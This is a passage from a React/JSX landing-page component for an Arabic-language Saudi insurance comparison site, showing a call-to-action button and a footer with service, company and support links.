              <p className="text-base lg:text-xl text-gray-600">ابدأ الآن واحصل على عرض سعر مخصص في أقل من دقيقتين</p>
            </div>

            <Button
              size="lg"
              className="bg-gradient-to-r from-blue-600 to-[#109cd4]  hover:from-[#109cd4]  hover:to-[#109cd4]  shadow-xl hover:shadow-2xl transition-all duration-300 px-8 lg:px-12 py-4 text-base lg:text-lg"
            >
              <Zap className="w-5 h-5 lg:w-6 lg:h-6 ml-2" />
              ابدأ المقارنة الآن - مجاناً
            </Button>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-gray-900 text-white">
        <div className="max-w-7xl mx-auto px-4 lg:px-6 py-12 lg:py-16">
          <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-8 mb-8 lg:mb-12">
            <div className="space-y-4">
              <div className="flex items-center gap-3">
                <img src="/Logo-AR.png" alt="logo" width={120} />
              </div>
              <p className="text-sm lg:text-base text-gray-400 leading-relaxed">
                منصة التأمين الرقمية الرائدة في السعودية. نقدم حلول تأمين ذكية ومبتكرة لحماية ما يهمك.
              </p>
              <div className="flex gap-3">
                <div className="w-8 h-8 lg:w-10 lg:h-10 bg-gray-800 hover:bg-blue-600 rounded-lg flex items-center justify-center cursor-pointer transition-colors">
                  <Globe className="w-4 h-4 lg:w-5 lg:h-5" />
                </div>
                <div className="w-8 h-8 lg:w-10 lg:h-10 bg-gray-800 hover:bg-blue-600 rounded-lg flex items-center justify-center cursor-pointer transition-colors">
                  <Phone className="w-4 h-4 lg:w-5 lg:h-5" />
                </div>
                <div className="w-8 h-8 lg:w-10 lg:h-10 bg-gray-800 hover:bg-blue-600 rounded-lg flex items-center justify-center cursor-pointer transition-colors">
                  <Mail className="w-4 h-4 lg:w-5 lg:h-5" />
                </div>
              </div>
            </div>

            <div>
              <h3 className="font-bold text-base lg:text-lg mb-4">الخدمات</h3>
              <ul className="space-y-2 lg:space-y-3 text-sm lg:text-base text-gray-400">
                <li>
                  <a href="#" className="hover:text-white transition-colors">
                    تأمين السيارات
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors">
                    التأمين الصحي
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors">
                    تأمين السفر
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors">
                    تأمين المنازل
                  </a>
                </li>
              </ul>
            </div>

            <div>
              <h3 className="font-bold text-base lg:text-lg mb-4">الشركة</h3>
              <ul className="space-y-2 lg:space-y-3 text-sm lg:text-base text-gray-400">
                <li>
                  <a href="#" className="hover:text-white transition-colors">
                    من نحن
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors">
                    فريق العمل
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors">
                    الوظائف
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors">
                    الأخبار
                  </a>
                </li>
              </ul>
            </div>

            <div>
              <h3 className="font-bold text-base lg:text-lg mb-4">الدعم</h3>
              <ul className="space-y-2 lg:space-y-3 text-sm lg:text-base text-gray-400">
                <li>
                  <a href="#" className="hover:text-white transition-colors">
                    مركز المساعدة
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors">
                    اتصل بنا
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors">
                    الأسئلة الشائعة
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors">
                    سياسة الخصوصية
                  </a>
                </li>
              </ul>
            </div>
          </div>

          <div className="border-t border-gray-800 pt-6 lg:pt-8 flex flex-col lg:flex-row justify-between items-center gap-4">
            <p className="text-xs lg:text-sm text-gray-400 text-center lg:text-right">
              © 2024 تأميني. جميع الحقوق محفوظة. مرخص من البنك المركزي السعودي.
            </p>
            <div className="flex items-center gap-4 lg:gap-6 text-xs lg:text-sm text-gray-400">
              <a href="#" className="hover:text-white transition-colors">
                الشروط والأحكام
              </a>
              <a href="#" className="hover:text-white transition-colors">
                سياسة الخصوصية
              </a>
              <a href="#" className="hover:text-white transition-colors">
                ملفات تعريف الارتباط
              </a>
            </div>
          </div>
        </div>
      </footer>
    </div>
  )
}
